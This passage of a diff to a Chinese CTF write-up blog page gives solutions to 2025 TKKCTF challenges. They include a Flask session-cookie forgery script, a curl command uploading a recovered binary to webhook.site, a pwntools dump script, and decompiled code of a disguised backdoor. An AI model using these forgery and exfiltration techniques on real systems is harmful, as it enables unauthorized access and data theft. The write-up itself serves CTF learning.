64; candidate++) &#123;<br>        if (!isComposite[candidate]) &#123;<br>            for (i = 0; i &lt; 313; i += candidate) &#123;<br>                isComposite[i] = candidate;<br>            &#125;<br>            hash[primeCounter] = (mathPow(candidate, .5) * maxWord) | 0;<br>            k[primeCounter++] = (mathPow(candidate, 1 / 3) * maxWord) | 0;<br>        &#125;<br>    &#125;<br>    ascii += &#x27;\x80&#x27;;<br>    while (ascii[lengthProperty] % 64 - 56) ascii += &#x27;\x00&#x27;;<br>    for (i = 0; i &lt; ascii[lengthProperty]; i++) &#123;<br>        j = ascii.charCodeAt(i);<br>        if (j &gt;&gt; 8) return;<br>        words[i &gt;&gt; 2] |= j &lt;&lt; ((3 - i) % 4) * 8;<br>    &#125;<br>    words[words[lengthProperty]] = ((asciiBitLength / maxWord) | 0);<br>    words[words[lengthProperty]] = (asciiBitLength);<br>    for (j = 0; j &lt; words[lengthProperty];) &#123;<br>        var w = words.slice(j, j += 16);<br>        var oldHash = hash;<br>        hash = hash.slice(0, 8);<br>        for (i = 0; i &lt; 64; i++) &#123;<br>            var w15 = w[i - 15], w2 = w[i - 2];<br>            var a = hash[0], e = hash[4];<br>            var temp1 = hash[7]<br>                + (rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25))<br>                + ((e &amp; hash[5]) ^ ((~e) &amp; hash[6]))<br>                + k[i]<br>                + (w[i] = (i &lt; 16) ? w[i] : (<br>                    w[i - 16]<br>                    + (rightRotate(w15, 7) ^ rightRotate(w15, 18) ^ (w15 &gt;&gt;&gt; 3))<br>                    + w[i - 7]<br>                    + (rightRotate(w2, 17) ^ rightRotate(w2, 19) ^ (w2 &gt;&gt;&gt; 10))<br>                ) | 0<br>                );<br>            var temp2 = (rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22))<br>                + ((a &amp; hash[1]) ^ (a &amp; hash[2]) ^ (hash[1] &amp; hash[2]));<br>            hash = [(temp1 + temp2) | 0].concat(hash);<br>            hash[4] = (hash[4] + temp1) | 0;<br>        &#125;<br>        for (i = 0; i &lt; 8; i++) &#123;<br>            hash[i] = (hash[i] + oldHash[i]) | 0;<br>        &#125;<br>    &#125;<br>    for (i = 0; i &lt; 8; i++) &#123;<br>        for (j = 3; j + 1; j--) &#123;<br>            var b = (hash[i] &gt;&gt; (j * 8)) &amp; 255;<br>            result += ((b &lt; 16) ? 0 : &#x27;&#x27;) + b.toString(16);<br>        &#125;<br>    &#125;<br>    return result;<br>&#125;<br><br>// 重写 verifyAndFetchFlag<br>window.verifyAndFetchFlag = async function(e, t) &#123;<br>    const salt = &quot;c3Mddbo1oit2CF92Clb9HenrjWBd6rXa&quot;;<br>    const msg = salt + e.toString() + t.toString();<br>    const hashHex = sha256(msg);<br>    <br>    console.log(&#x27;计算哈希:&#x27;, hashHex);<br>    console.log(&#x27;参数:&#x27;, e, t);<br>    <br>    fetch(&#x27;/secrets/&#x27; + hashHex + &#x27;.txt&#x27;)<br>        .then(response =&gt; &#123;<br>            if (response.ok) return response.text();<br>            throw new Error(&#x27;404 Not Found&#x27;);<br>        &#125;)<br>        .then(flag =&gt; &#123;<br>            navigator.clipboard.writeText(flag.trim());<br>            alert(&#x27;Success! Flag copied: &#x27; + flag.trim());<br>        &#125;)<br>        .catch(err =&gt; &#123;<br>            console.error(err);<br>            alert(&#x27;Verification Failed.&#x27;);<br>        &#125;);<br>&#125;;<br>console.log(&#x27;verifyAndFetchFlag 已重写，使用本地 SHA-256 实现&#x27;);<br></code></pre></td></tr></table></figure>
 
@@ -400,7 +466,7 @@
 
 
 
-<h2 id="吃吃吃"><a href="#吃吃吃" class="headerlink" title="吃吃吃"></a>吃吃吃</h2><p>![](2025 TKKCTF&#x2F;1765094131496-1cae7a0b-3faf-498f-a18f-ba124d5fe360.png)</p>
+<h2 id="吃吃吃"><a href="#吃吃吃" class="headerlink" title="吃吃吃"></a>吃吃吃</h2><p><img src="/2025_TKKCTF/1765094131496-1cae7a0b-3faf-498f-a18f-ba124d5fe360.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs plain">import requests<br>from itsdangerous import URLSafeTimedSerializer<br>import secrets<br>from datetime import datetime<br><br># 生成会话cookie<br>def generate_cookie():<br>    secret_key = &quot;welcometotkkctf&quot;<br>    s = URLSafeTimedSerializer(<br>        secret_key,<br>        salt=&#x27;cookie-session&#x27;,<br>        signer_kwargs=&#123;&#x27;key_derivation&#x27;: &#x27;hmac&#x27;, &#x27;digest_method&#x27;: &#x27;SHA1&#x27;&#125;<br>    )<br>    now = datetime.now()<br>    user_id = f&quot;&#123;now.hour&#125;&#123;now.minute&#125;/&quot; + secrets.token_urlsafe(30)<br>    session_data = &#123;&#x27;user&#x27;: user_id, &#x27;balance&#x27;: 100000&#125;<br>    cookie = s.dumps(session_data)<br>    return cookie<br><br># 目标URL（替换为实际IP和端口）<br>url = &quot;http://47.122.52.77:33452/&quot;  # 例如: http://192.168.1.100:9999<br><br># 生成cookie<br>cookie = generate_cookie()<br>headers = &#123;&#x27;Cookie&#x27;: f&#x27;session=&#123;cookie&#125;&#x27;&#125;<br>print(f&quot;生成的Cookie: &#123;cookie&#125;&quot;)<br><br># 创建会话保持cookie<br>s = requests.Session()<br>s.headers.update(headers)<br><br>try:<br>    # 1. 访问首页初始化余额<br>    r = s.get(url)<br>    print(f&quot;访问首页状态码: &#123;r.status_code&#125;&quot;)<br>    if r.status_code != 200:<br>        print(&quot;首页访问失败，检查URL和网络&quot;)<br>        exit()<br><br>    # 2. 购买两个面条<br>    for i in range(2):<br>        r = s.post(url + &quot;/buy_noodles&quot;)<br>        print(f&quot;购买面条 &#123;i+1&#125;: &#123;r.text&#125;&quot;)<br>        if &quot;错误&quot; in r.text:<br>            print(&quot;购买面条失败，余额不足&quot;)<br>            exit()<br><br>    # 3. 购买一个零食<br>    r = s.post(url + &quot;/buy_snack&quot;)<br>    print(f&quot;购买零食: &#123;r.text&#125;&quot;)<br>    if &quot;错误&quot; in r.text:<br>        print(&quot;购买零食失败，余额不足&quot;)<br>        exit()<br><br>    # 4. 访问/eat获取flag<br>    r = s.get(url + &quot;/eat&quot;)<br>    print(&quot;\n=== 结果 ===&quot;)<br>    print(r.text)<br>    if &quot;GZCTF&quot; in r.text or &quot;flag&quot; in r.text.lower():<br>        print(&quot;✅ 成功获取flag!&quot;)<br>    else:<br>        print(&quot;❌ 未找到flag，检查购买是否成功&quot;)<br>except Exception as e:<br>    print(f&quot;请求失败: &#123;e&#125;&quot;)<br></code></pre></td></tr></table></figure>
 
 
@@ -408,15 +474,15 @@
 
 
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p>更是新颖啊，evtx文件我还第一次见呢</p>
-<p>![](2025 TKKCTF&#x2F;1765019972824-4673c0b0-e6b8-4147-aea1-49621e99e846.png)</p>
+<p><img src="/2025_TKKCTF/1765019972824-4673c0b0-e6b8-4147-aea1-49621e99e846.png" srcset="/img/loading.gif" lazyload></p>
 <p>一条条看有点太折磨了</p>
 <p>大概是14.21左右有人点开了这个加密的pdf</p>
 <p>然后弹了UAC</p>
 <p>之后在14.26左右开始出现一堆Powershell进程了</p>
-<p>![](2025 TKKCTF&#x2F;1765020378321-fab07253-84ea-4bb1-aa54-cbebb5e7a426.png)</p>
+<p><img src="/2025_TKKCTF/1765020378321-fab07253-84ea-4bb1-aa54-cbebb5e7a426.png" srcset="/img/loading.gif" lazyload></p>
 <p>这些Powershell在一次次往b.dat里边塞Base64</p>
 <p>目的是合成大脚本</p>
-<p>![](2025 TKKCTF&#x2F;1765020467202-745b9c15-65c6-4568-acdf-3c004c86d7de.png)</p>
+<p><img src="/2025_TKKCTF/1765020467202-745b9c15-65c6-4568-acdf-3c004c86d7de.png" srcset="/img/loading.gif" lazyload></p>
 <p>最后干出来了，用certutil把b.dat解码了，变成了Powershell脚本</p>
 <p>这里边有两个至关重要出现的Key1和Key2</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Key1=TkkcSecProtectsTanKahKeeCollege<br>Key2=ictoryIsOursLonliveTotheCTF<br></code></pre></td></tr></table></figure>
@@ -432,32 +498,32 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">powershell -ExecutionPolicy Bypass -File .\decrypt.ps1<br></code></pre></td></tr></table></figure>
 
 <p>即可得到</p>
-<p>![](2025 TKKCTF&#x2F;1765021056226-9be28820-fd46-40b0-b31c-287486307910.png)</p>
-<p>![](2025 TKKCTF&#x2F;1765021160532-14f9130e-cffb-4c22-a540-05f1ea68148a.png)</p>
+<p><img src="/2025_TKKCTF/1765021056226-9be28820-fd46-40b0-b31c-287486307910.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025_TKKCTF/1765021160532-14f9130e-cffb-4c22-a540-05f1ea68148a.png" srcset="/img/loading.gif" lazyload></p>
 <p>打开就是flag</p>
-<h2 id="Screen-Shot"><a href="#Screen-Shot" class="headerlink" title="Screen Shot"></a>Screen Shot</h2><p>![](2025 TKKCTF&#x2F;1765016892791-cfd6b480-26f8-46a4-abbd-f0e4fb75dfd3.png)</p>
+<h2 id="Screen-Shot"><a href="#Screen-Shot" class="headerlink" title="Screen Shot"></a>Screen Shot</h2><p><img src="/2025_TKKCTF/1765016892791-cfd6b480-26f8-46a4-abbd-f0e4fb75dfd3.png" srcset="/img/loading.gif" lazyload></p>
 <p>其实我感觉是蛮贴合实际的一道好题目</p>
 <p>首先给了一个kali404，是一个删完了bash_history的日志</p>
 <p>日志不长，我们直接记事本打开就能看</p>
-<p>![](2025 TKKCTF&#x2F;1765017962510-5a917f16-581a-4352-8069-a92d6753f42e.png)</p>
+<p><img src="/2025_TKKCTF/1765017962510-5a917f16-581a-4352-8069-a92d6753f42e.png" srcset="/img/loading.gif" lazyload></p>
 <p>这边很显眼有个base64</p>
-<p>![](2025 TKKCTF&#x2F;1765018255935-9af88963-24ac-4c43-a6ed-dcc3ff649882.png)</p>
+<p><img src="/2025_TKKCTF/1765018255935-9af88963-24ac-4c43-a6ed-dcc3ff649882.png" srcset="/img/loading.gif" lazyload></p>
 <p>解开得到了个Site 4</p>
-<p>![](2025 TKKCTF&#x2F;1765018374507-3d7f4322-03d8-4f18-b396-f5978e559aff.png)</p>
+<p><img src="/2025_TKKCTF/1765018374507-3d7f4322-03d8-4f18-b396-f5978e559aff.png" srcset="/img/loading.gif" lazyload></p>
 <p>这边还有一系列的提示，例如东边有Groom干湖，在NW侧的停机坪上等等</p>
 <p>有许许多多的提示确定了这个最后的方位在美国内华达Nevada Test and Training Range（NTTR）&#x2F;Nellis相关区域</p>
-<p>![](2025 TKKCTF&#x2F;1765018634689-287db60e-d37d-4020-b3f5-b9114fe1bb42.png)</p>
+<p><img src="/2025_TKKCTF/1765018634689-287db60e-d37d-4020-b3f5-b9114fe1bb42.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们很快就能定位到这个地方</p>
 <p>然后根据描述，是右边就是干湖的</p>
 <p>这边大方位都是上方干湖</p>
 <p>所以可以锁定差不多在这边</p>
-<p>![](2025 TKKCTF&#x2F;1765018682385-e3e91638-6df0-46b8-beb1-b5c34c6a6b29.png)</p>
+<p><img src="/2025_TKKCTF/1765018682385-e3e91638-6df0-46b8-beb1-b5c34c6a6b29.png" srcset="/img/loading.gif" lazyload></p>
 <p>又说是直升机</p>
-<p>![](2025 TKKCTF&#x2F;1765018697197-ac18f78b-d5e5-49ab-8c92-edefcef3f9cf.png)</p>
+<p><img src="/2025_TKKCTF/1765018697197-ac18f78b-d5e5-49ab-8c92-edefcef3f9cf.png" srcset="/img/loading.gif" lazyload></p>
 <p>基本可以确定是这一架了</p>
-<p>![](2025 TKKCTF&#x2F;1765018720612-a98e0b83-bdcd-4653-ad7a-cdfb343915b8.png)</p>
+<p><img src="/2025_TKKCTF/1765018720612-a98e0b83-bdcd-4653-ad7a-cdfb343915b8.png" srcset="/img/loading.gif" lazyload></p>
 <p>所以flag为xujc{-115.8123_37.2471}（注意顺序即可）</p>
-<h2 id="Operation-Ghost"><a href="#Operation-Ghost" class="headerlink" title="Operation Ghost"></a>Operation Ghost</h2><p>![](2025 TKKCTF&#x2F;1765186128080-b44636e2-c366-461e-8a33-d081e330866a.png)</p>
+<h2 id="Operation-Ghost"><a href="#Operation-Ghost" class="headerlink" title="Operation Ghost"></a>Operation Ghost</h2><p><img src="/2025_TKKCTF/1765186128080-b44636e2-c366-461e-8a33-d081e330866a.png" srcset="/img/loading.gif" lazyload></p>
 <p>对于这一类题目的了解程度感觉十分欠缺，也不知道如何将里边的可疑文件提出来，由本题展开学习。</p>
 <p>本题目复现借鉴了Red师傅和Aristore师傅</p>
 <p><a target="_blank" rel="noopener" href="https://redshome.top/posts/2025-12-08-2025-tkkctf/">https://redshome.top/posts/2025-12-08-2025-tkkctf/</a></p>
@@ -467,25 +533,25 @@
 <p>蜜罐一般分为低交互和高交互蜜罐：低交互蜜罐会提供有限容易设置的信息，系统也只提供最低等级的交互，运维方便，但也容易被攻击者识别；至于高交互，更自由一点，开放世界，攻击者更便于横向渗透，而防守方也更方便后续溯源。</p>
 <p>本题就是这样子一个蜜罐，被黑客打了，但是黑客隐藏起来了，我们需要找到他留下来的秘密</p>
 <p>我们打开本环境</p>
-<h3 id="寻找秘密文件"><a href="#寻找秘密文件" class="headerlink" title="寻找秘密文件"></a>寻找秘密文件</h3><p>![](2025 TKKCTF&#x2F;1765186670231-5ffa52f7-5025-4357-9204-ecf73e6b3e1a.png)</p>
+<h3 id="寻找秘密文件"><a href="#寻找秘密文件" class="headerlink" title="寻找秘密文件"></a>寻找秘密文件</h3><p><img src="/2025_TKKCTF/1765186670231-5ffa52f7-5025-4357-9204-ecf73e6b3e1a.png" srcset="/img/loading.gif" lazyload></p>
 <p>输入root即可进入环境，根据题目所述，找不到可疑文件，因此我们考虑去进程搜索</p>
 <p>查找一下指向(deleted)的进程</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ls -l /proc/*/exe 2&gt;/dev/null | grep deleted<br></code></pre></td></tr></table></figure>
 
-<p>![](2025 TKKCTF&#x2F;1765186868421-dc1f9d47-4fe1-48bf-a767-1b0ee121854a.png)</p>
+<p><img src="/2025_TKKCTF/1765186868421-dc1f9d47-4fe1-48bf-a767-1b0ee121854a.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功找到了一个进程，PID为44</p>
 <p>我们发现这个蜜罐允许strace命令， 那我们用strace -p 44来观察一下进程的行为</p>
-<p>![](2025 TKKCTF&#x2F;1765187308615-68c21b94-9b3d-4152-81cf-2d90d45df755.png)</p>
+<p><img src="/2025_TKKCTF/1765187308615-68c21b94-9b3d-4152-81cf-2d90d45df755.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现这个进程20秒就会重新运行一次</p>
 <p>再看看环境</p>
-<p>![](2025 TKKCTF&#x2F;1765196598143-daf7c7fc-5e4e-400a-afa2-55fdd88b26b3.png)</p>
+<p><img src="/2025_TKKCTF/1765196598143-daf7c7fc-5e4e-400a-afa2-55fdd88b26b3.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现这边有一个Key：X-TKKC-Key-2025</p>
 <p>说明后边可能要解密啥的，至少也说明我们找对了，就是和这个进程有关</p>
 <p>我们尝试恢复这个删除的文件，利用系统会在进程运行时把可执行文件备份在内存的这个特性，我们可以用cp把这个进程给备份出来</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cp /proc/44/exe /tmp/1.bin<br></code></pre></td></tr></table></figure>
 
 <h3 id="尝试恢复文件"><a href="#尝试恢复文件" class="headerlink" title="尝试恢复文件"></a>尝试恢复文件</h3><p>接下来我们想尝试能否将这个程序给提取出来查看内部结构，因此我们可以先测试是否出网</p>
-<p>![](2025 TKKCTF&#x2F;1765193394660-2b3f4cae-4ad8-4620-bfed-9a2fca4f9eba.png)</p>
+<p><img src="/2025_TKKCTF/1765193394660-2b3f4cae-4ad8-4620-bfed-9a2fca4f9eba.png" srcset="/img/loading.gif" lazyload></p>
 <p>ping百度发现能ping通，因此是出网环境</p>
 <p>利用webhook进行提取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl -v -F &#x27;file=@/tmp/1.bin&#x27; https://webhook.site/32079797-3f62-4409-988a-2c035c9acf16<br></code></pre></td></tr></table></figure>
@@ -496,23 +562,23 @@
 <p>是在利用pwntools过前边几步然后以base64编码带出来</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs plain">import sys<br>import threading<br>import time<br>from pwn import *<br><br>HOST = &#x27;47.122.52.77&#x27;<br>PORT = 33785<br>LOG_FILENAME = &quot;ghost.log&quot;<br><br>def main():<br>    try:<br>        io = remote(HOST, PORT)<br>    except:<br>        print(&quot;[-] 连接失败&quot;)<br>        return<br><br>    io.recvuntil(b&quot;TKKCSec login:&quot;)<br>    io.sendline(b&#x27;root&#x27;)<br><br>    io.recvuntil(b&#x27;#&#x27;)<br><br>    # 打开日志文件准备写入<br>    log_file = open(LOG_FILENAME, &#x27;wb&#x27;)<br>    <br>    # 定义一个标志位用于控制线程退出<br>    running = True<br><br>    # 接收<br>    def receiver():<br>        while running:<br>            try:<br>                # 每次读取一点数据<br>                data = io.recv(timeout=0.1)<br>                if not data:<br>                    continue<br>                <br>                # 写入文件<br>                log_file.write(data)<br>                log_file.flush()<br>            except EOFError:<br>                print(&quot;\n[*] 断开连接&quot;)<br>                break<br>            except Exception:<br>                break<br><br>    # 启动接收线程<br>    t = threading.Thread(target=receiver)<br>    t.daemon = True<br>    t.start()<br><br>    io.sendline(&quot;PID=$(ls -al /proc/*/exe 2&gt;/dev/null | grep deleted | awk -F/ &#x27;&#123;print $3&#125;&#x27; | head -n 1)&quot;.encode())<br>    time.sleep(2)<br>    io.sendline(&quot;cp /proc/$PID/exe /tmp/kworker_u4_0&quot;.encode())<br>    time.sleep(2)<br>    io.sendline(&quot;base64 /tmp/kworker_u4_0&quot;.encode())<br>    time.sleep(10)<br><br>    # 清理<br>    running = False<br>    log_file.close()<br>    io.close()<br><br>if __name__ == &quot;__main__&quot;:<br>    main()<br></code></pre></td></tr></table></figure>
 
-<p>![](2025 TKKCTF&#x2F;1765195363846-593a563d-0e37-44f8-95d2-6cce0e7c9a65.png)</p>
+<p><img src="/2025_TKKCTF/1765195363846-593a563d-0e37-44f8-95d2-6cce0e7c9a65.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功提取出来，我们去base64编码一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python3<br>import base64<br>import sys<br>import os<br><br>def main():<br>    base64_data = sys.stdin.read()<br>    base64_data = &#x27;&#x27;.join([ch for ch in base64_data if ch in &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;])<br>    <br>    try:<br>        decoded_data = base64.b64decode(base64_data)<br>    except Exception as e:<br>        print(&quot;解码失败:&quot;, e)<br>        sys.exit(1)<br><br>    output_file = &quot;1.bin&quot;<br><br>    with open(output_file, &#x27;wb&#x27;) as f:<br>        f.write(decoded_data)<br>    print(&quot;解密完成，输出文件:&quot;, output_file)<br>    print(&quot;文件大小:&quot;, len(decoded_data), &quot;字节&quot;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    main()<br></code></pre></td></tr></table></figure>
 
 <p>成功提取出文件，放入die看看</p>
-<h3 id="文件逻辑分析"><a href="#文件逻辑分析" class="headerlink" title="文件逻辑分析"></a>文件逻辑分析</h3><p>![](2025 TKKCTF&#x2F;1765196662449-bab64788-40bf-4f13-a4f3-14f70bff9698.png)</p>
+<h3 id="文件逻辑分析"><a href="#文件逻辑分析" class="headerlink" title="文件逻辑分析"></a>文件逻辑分析</h3><p><img src="/2025_TKKCTF/1765196662449-bab64788-40bf-4f13-a4f3-14f70bff9698.png" srcset="/img/loading.gif" lazyload></p>
 <p>放到64位IDA中查看</p>
-<p>![](2025 TKKCTF&#x2F;1765196770521-ee3c8373-8601-4d41-bcbc-039a4324e383.png)</p>
+<p><img src="/2025_TKKCTF/1765196770521-ee3c8373-8601-4d41-bcbc-039a4324e383.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到程序从这边开始，这边也是和我们刚刚的内容吻合，程序伪装成了Linux内核工作线程 [kworker&#x2F;u4:0]之后每20秒进行了一次后门sub_40191A函数</p>
 <p>核心在于这边的sub_40191A函数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs plain">_BYTE *sub_40191A()<br>&#123;<br>  _BYTE *result; // rax<br>  int v1; // r8d<br>  int v2; // r9d<br>  __int64 v3; // rax<br>  char v4[512]; // [rsp+0h] [rbp-3A0h] BYREF<br>  char v5[128]; // [rsp+200h] [rbp-1A0h] BYREF<br>  __int16 v6[2]; // [rsp+280h] [rbp-120h] BYREF<br>  int v7; // [rsp+284h] [rbp-11Ch]<br>  char v8[64]; // [rsp+290h] [rbp-110h] BYREF<br>  char v9[128]; // [rsp+2D0h] [rbp-D0h] BYREF<br>  char v10[16]; // [rsp+350h] [rbp-50h] BYREF<br>  char v11[20]; // [rsp+360h] [rbp-40h] BYREF<br>  unsigned int v12; // [rsp+374h] [rbp-2Ch]<br>  _BYTE *v13; // [rsp+378h] [rbp-28h]<br>  _BYTE *v14; // [rsp+380h] [rbp-20h]<br>  _BYTE *v15; // [rsp+388h] [rbp-18h]<br>  _BYTE *v16; // [rsp+390h] [rbp-10h]<br>  _BYTE *v17; // [rsp+398h] [rbp-8h]<br><br>  strcpy(v11, &quot;TKKC_AUTH_TOKEN&quot;);<br>  result = (_BYTE *)sub_404A40(v11);<br>  v17 = result;<br>  if ( result )<br>  &#123;<br>    sub_4017BB(v17, v10);<br>    sub_40185E(&amp;unk_4A40E0, 72LL, v10, v9);<br>    sub_40185E(&amp;unk_4A4130, 24LL, v10, v8);<br>    result = (_BYTE *)sub_401060(v9, &amp;unk_477010);<br>    v16 = result;<br>    if ( result )<br>    &#123;<br>      v16 += 3;<br>      result = (_BYTE *)sub_4010C0(v16, 47LL);<br>      v15 = result;<br>      if ( result )<br>      &#123;<br>        *v15 = 0;<br>        v14 = v16;<br>        v13 = v15 + 1;<br>        v12 = sub_417D80(2LL, 1LL, 0LL);<br>        v6[0] = 2;<br>        v6[1] = sub_417EB0(9050LL);<br>        v7 = sub_4180B0(&quot;127.0.0.1&quot;);<br>        if ( (int)sub_417D60(v12, v6, 16LL) &gt;= 0 )<br>        &#123;<br>          sub_404CA0((unsigned int)v5, 128, (unsigned int)v8, (_DWORD)v17, v1, v2, v4[0]);<br>          sub_404CA0(<br>            (unsigned int)v4,<br>            512,<br>            (unsigned int)&quot;GET /%s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n&quot;,<br>            (_DWORD)v13,<br>            (_DWORD)v14,<br>            (unsigned int)v5,<br>            v4[0]);<br>          v3 = sub_4010B8(v4);<br>          sub_416EC0(v12, v4, v3);<br>          return (_BYTE *)sub_416EA0(v12);<br>        &#125;<br>        else<br>        &#123;<br>          return (_BYTE *)sub_416EA0(v12);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>这个后门主要干了4件事</p>
 <p>1，先读取环境变量</p>
-<p>![](2025 TKKCTF&#x2F;1765197113641-4d7a1175-cc1c-4353-918f-778b7152b554.png)</p>
+<p><img src="/2025_TKKCTF/1765197113641-4d7a1175-cc1c-4353-918f-778b7152b554.png" srcset="/img/loading.gif" lazyload></p>
 <p>2，从token生成密钥</p>
-<p>![](2025 TKKCTF&#x2F;1765197133664-ac8d5cf7-dec1-4582-82e8-5415fdd1ced1.png)</p>
+<p><img src="/2025_TKKCTF/1765197133664-ac8d5cf7-dec1-4582-82e8-5415fdd1ced1.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到用的是FNV-1a哈希和线性同余生成器(LCG)</p>
 <p>我们token是X-TKKC-Key-2025</p>
 <p>所以得到token</p>
@@ -520,13 +586,13 @@
 
 <p>key&#x3D;[‘0xdfaaee15’, ‘0xf3066870’, ‘0x544ee10f’, ‘0xec935b22’]</p>
 <p>3，解密URL和User-Agent模板</p>
